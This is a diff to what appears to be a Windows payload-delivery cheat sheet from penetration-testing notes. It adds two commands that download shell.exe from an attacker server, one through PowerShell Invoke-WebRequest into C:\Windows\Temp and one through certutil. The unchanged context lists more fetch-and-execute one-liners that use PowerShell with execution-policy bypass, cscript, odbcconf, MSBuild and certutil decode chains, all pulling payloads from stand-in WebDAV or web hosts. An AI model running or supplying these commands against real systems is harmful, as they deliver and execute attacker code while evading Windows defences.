@@ -16,6 +16,9 @@ powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 # Cmd
 cmd.exe /k < \\webdavserver\folder\batchfile.txt
 
+## cmd using powershell
+powershell -c "Invoke-WebRequest -Uri 'http://$IP:8000/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
+
 # Cscript / Wscript
 cscript //E:jscript \\webdavserver\folder\payload.txt
 
@@ -42,6 +45,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 
 # Certutil
+certutil -urlcache -f http://webserver:8000/shell.exe shell.exe
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 
